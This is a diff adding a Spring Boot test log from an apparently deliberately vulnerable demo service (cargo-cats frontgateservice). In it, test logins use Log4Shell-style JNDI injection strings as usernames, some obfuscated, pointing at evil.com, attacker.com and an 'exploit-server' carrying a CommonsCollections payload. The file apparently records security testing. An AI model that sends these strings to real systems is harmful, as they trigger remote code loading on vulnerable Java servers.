@@ -1,0 +1,20 @@
+2025-12-08 17:23:48.620 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - Starting FrontGateServiceApplicationTests using Java 11.0.29 on runnervmoqczp with PID 2910 (started by runner in /home/runner/work/cargo-cats/cargo-cats/services/frontgateservice)
+2025-12-08 17:23:48.622 [main] DEBUG com.contrast.frontgateservice.FrontGateServiceApplicationTests - Running with Spring Boot v2.6.15, Spring v5.3.27
+2025-12-08 17:23:48.623 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - No active profile set, falling back to 1 default profile: "default"
+2025-12-08 17:23:50.572 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - Started FrontGateServiceApplicationTests in 2.209 seconds (JVM running for 4.405)
+2025-12-08 17:26:05.661 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - Starting FrontGateServiceApplicationTests using Java 11.0.29 on runnervmoqczp with PID 3066 (started by runner in /home/runner/work/cargo-cats/cargo-cats/services/frontgateservice)
+2025-12-08 17:26:05.663 [main] DEBUG com.contrast.frontgateservice.FrontGateServiceApplicationTests - Running with Spring Boot v2.6.15, Spring v5.3.27
+2025-12-08 17:26:05.664 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - No active profile set, falling back to 1 default profile: "default"
+2025-12-08 17:26:07.229 [main] INFO  com.contrast.frontgateservice.FrontGateServiceApplicationTests - Started FrontGateServiceApplicationTests in 1.806 seconds (JVM running for 2.936)
+2025-12-08 17:26:07.625 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: nonexistent
+2025-12-08 17:26:07.628 [main] ERROR com.contrast.frontgateservice.service.CustomUserDetailsService - Failed login attempt for non-existent user
+2025-12-08 17:26:07.633 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: normaluser
+2025-12-08 17:26:07.633 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Successful authentication for user: normaluser
+2025-12-08 17:26:07.638 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: ::-j::-n::-d::-i:::-l::-d::-a::-p://evil.com/a
+2025-12-08 17:26:07.638 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Successful authentication for user: ::-j::-n::-d::-i:::-l::-d::-a::-p://evil.com/a
+2025-12-08 17:26:07.640 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: jndi:ldap://attacker.com/a
+2025-12-08 17:26:07.640 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Successful authentication for user: jndi:ldap://attacker.com/a
+2025-12-08 17:26:07.642 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: user@example.com
+2025-12-08 17:26:07.643 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Successful authentication for user: user@example.com
+2025-12-08 17:26:07.644 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Login attempt for user: jndi:ldap://exploit-server:1389/serial/CommonsCollections
+2025-12-08 17:26:07.645 [main] INFO  com.contrast.frontgateservice.service.CustomUserDetailsService - Successful authentication for user: jndi:ldap://exploit-server:1389/serial/CommonsCollections
